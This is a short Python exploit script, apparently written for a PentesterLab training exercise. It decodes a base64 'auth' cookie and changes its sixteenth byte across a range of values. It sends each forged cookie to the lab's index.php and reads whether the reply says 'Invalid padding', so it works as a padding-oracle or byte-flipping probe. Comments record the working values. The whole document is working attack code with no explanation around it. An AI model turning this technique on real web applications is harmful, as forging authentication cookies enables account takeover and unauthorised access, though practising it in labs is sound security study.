import base64
import requests

url = 'http://ptl-85580ef2-7e2cb13a.libcurl.so/index.php'
hi = base64.b64decode('u7bvLewln6PsnssjtE1yY37bQJvrRuxK') #len=24
xs = bytearray(b'')
cookies = {}

for i in range(len(hi)):xs.append(hi[i])
for i in range(95,105):
    xs[15] = i
    cookies['auth'] = base64.b64encode(xs).decode()
    response = requests.get(url,cookies=cookies)
    if 'Invalid padding' not in response.text:
        print(i,"yes") #99, 101
    else:
        print(i,"no")

